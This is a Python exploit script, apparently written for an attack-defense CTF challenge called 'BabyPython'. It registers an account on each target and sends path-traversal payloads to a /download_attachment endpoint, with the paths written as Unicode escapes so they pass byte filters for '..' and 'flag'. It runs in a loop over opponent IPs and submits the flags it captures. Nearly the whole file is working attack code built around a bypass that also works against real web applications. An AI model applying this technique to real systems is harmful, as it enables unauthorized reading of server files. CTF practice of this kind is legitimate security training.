#!/usr/bin/env python3
"""
BabyPython Exploit - Unicode Escape Path Traversal
===================================================
Vulnerability: Path traversal in /download_attachment
Bypass: Unicode escape encoding bypasses byte checks for '..' and 'flag'
"""
import sys
import argparse
import time
import re
import random
import string
import requests

from awd_lib import chal, submit, get_targets, get_our_ip

chal("babypython.csv")

PORT = 5000
TIMEOUT = 8


def random_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase, k=n))


def unicode_encode(s):
    """Encode each char as unicode escape to bypass byte filters"""
    return ''.join('\\u{:04x}'.format(ord(c)) for c in s)


def extract_flag(text):
    """Extract flag from response"""
    for pattern in [r'hkcert\d{2}\{[^}]+\}', r'flag\{[^}]+\}', r'FLAG\{[^}]+\}']:
        match = re.search(pattern, text)
        if match:
            return match.group(0)
    return None


def exploit(ip, port=PORT):
    """Unicode escape path traversal exploit"""
    try:
        base_url = f"http://{ip}:{port}"
        session = requests.Session()
        
        # Register and login
        username = f"exp_{random_str()}"
        session.post(f"{base_url}/register", 
                    data={"username": username, "password": username}, 
                    timeout=TIMEOUT)
        session.post(f"{base_url}/login", 
                    data={"username": username, "password": username}, 
                    timeout=TIMEOUT)
        
        # Try paths with unicode encoding
        for path in ["/flag", "../../../../flag"]:
            encoded = unicode_encode(path)
            payload = '{"path": "' + encoded + '"}'
            
            r = session.post(
                f"{base_url}/download_attachment",
                data=payload,
                headers={"Content-Type": "application/json"},
                timeout=TIMEOUT
            )
            
            if r.status_code == 200:
                flag = extract_flag(r.text)
                if flag:
                    return flag
        return None
    except Exception as e:
        return None


def main():
    parser = argparse.ArgumentParser(description='BabyPython Exploit')
    parser.add_argument('--target', '-t', help='Single target IP')
    parser.add_argument('--port', '-p', type=int, default=PORT)
    parser.add_argument('--loop', '-l', action='store_true', help='Loop continuously')
    parser.add_argument('--delay', '-d', type=int, default=60, help='Loop delay')
    args = parser.parse_args()
    
    my_ip = get_our_ip()
    targets = [args.target] if args.target else get_targets()
    targets = [ip for ip in targets if ip != my_ip]
    
    print(f"[*] Our IP: {my_ip}, Targets: {len(targets)}")
    
    if not targets:
        # Hardcode targets if CSV parsing fails
        targets = ['172.28.36.32', '172.28.36.33', '172.28.36.34', '172.28.36.35']
        targets = [ip for ip in targets if ip != my_ip]
        print(f"[*] Using hardcoded targets: {targets}")
    
    round_num = 0
    while True:
        round_num += 1
        success = failed = new_flags = 0
        start = time.time()
        
        print(f"\n=== Round {round_num} ===")
        
        for ip in targets:
            flag = exploit(ip, args.port)
            if flag:
                result = submit(flag, target=ip)
                status = "NEW" if result.get('success') and not result.get('duplicate') else "dup"
                print(f"[+] {ip}: {flag} ({status})")
                success += 1
                if status == "NEW":
                    new_flags += 1
            else:
                print(f"[-] {ip}: failed")
                failed += 1
        
        print(f"[*] Round {round_num}: {success} ok, {failed} fail, {new_flags} NEW ({time.time()-start:.1f}s)")
        
        if not args.loop:
            break
        
        print(f"[*] Sleeping {args.delay}s...")
        try:
            time.sleep(args.delay)
        except KeyboardInterrupt:
            print("\n[!] Stopped")
            break


if __name__ == '__main__':
    main()
